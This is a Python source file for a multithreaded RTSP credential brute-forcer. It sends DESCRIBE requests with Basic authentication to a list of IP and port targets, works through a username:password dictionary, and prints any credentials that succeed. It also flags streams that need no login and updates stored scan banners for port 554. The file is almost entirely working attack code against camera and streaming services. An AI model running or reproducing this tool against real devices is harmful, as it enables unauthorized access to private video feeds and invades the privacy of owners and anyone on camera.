import base64
import socket
import threading
import queue
import time
from common import cargar_datos, guardar_datos, eliminar_duplicados, buscar_palabra

class RtspBrute:
    def __init__(self, targets, dictionary_file):
        self.targets = targets
        self.dictionary = self.load_dictionary(dictionary_file)
        self.q = queue.Queue()

    def load_dictionary(self, dictionary_file):
        with open(dictionary_file, 'r') as f:
            return [line.strip() for line in f.readlines()]

    def run(self):
        threads = min(len(self.targets), 100)
        for target in self.targets:
            self.q.put(target)

        print(f"Using {threads} threads")
        _threads = [threading.Thread(target=self.brute_force) for _ in range(threads)]
        
        for t in _threads:
            t.setDaemon(True)
            t.start()
        
        for t in _threads:
            t.join()

        print("Finished all threads")

    def rtsp_request(self, target, username="", password=""):
        ip, port = target
        auth = f"{username}:{password}" if username else ""
        auth_base64 = base64.b64encode(auth.encode()).decode() if auth else ""
        req = f"DESCRIBE rtsp://{ip}:{port} RTSP/1.0\r\nCSeq: 2\r\n" + \
              (f"Authorization: Basic {auth_base64}\r\n" if auth_base64 else "") + "\r\n"

        try:
            with socket.create_connection((ip, port), timeout=5) as s:
                s.sendall(req.encode())
                return s.recv(1024).decode()
        except (socket.timeout, TimeoutError, socket.error, OSError):
            return None

    def brute_force(self):
        while not self.q.empty():
            target = self.q.get()
            data = self.rtsp_request(target)
            if data and "401 Unauthorized" in data:
                for credential in self.dictionary:
                    username, password = credential.split(':')
                    data = self.rtsp_request(target, username, password)
                    if data and "200 OK" in data:
                        print(f"{target},{username},{password}")
                        return
                    elif data and "401 Unauthorized" in data:
                        time.sleep(1)
            elif data and "200 OK" in data:
                print(f"The RTSP service at: {target} allows unauthorized access and does not need a username/password")
                self.actualizar_banners()
                return(f"The RTSP service at: {target} credentials not necessary")

    def actualizar_banners(self):
        datos_filtrados = cargar_datos()
        for dato in datos_filtrados:
            if dato["Puerto"] == 554 and (dato["Banner"] == "\u001b[31munknown\u001b[0m" or not dato["Banner"]):
                ip, puerto = dato["IP"], dato["Puerto"]
                rtsp_data = self.rtsp_request((ip, puerto))
                if rtsp_data:
                    print(f"El banner para {dato['IP']}:{dato['Puerto']} fue reemplazado por datos RTSP.")
                    dato["Banner"] = rtsp_data
                else:
                    print(f"No se pudo obtener datos RTSP para {dato['IP']}:{dato['Puerto']}.")
        try:
            guardar_datos(datos_filtrados)
        except Exception as e:
            print(f"Error al guardar datos: {e}")
